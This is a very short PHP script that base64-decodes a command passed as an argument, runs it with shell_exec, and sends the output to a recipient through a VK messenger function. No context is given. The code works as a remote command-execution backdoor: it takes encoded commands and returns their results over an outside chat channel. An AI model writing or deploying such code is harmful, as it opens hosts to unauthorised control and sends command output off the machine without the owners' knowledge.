<?php
include 'config.php';
$exec = shell_exec(base64_decode($argv[1]));
vk_msg_send($argv[2], $exec);
?>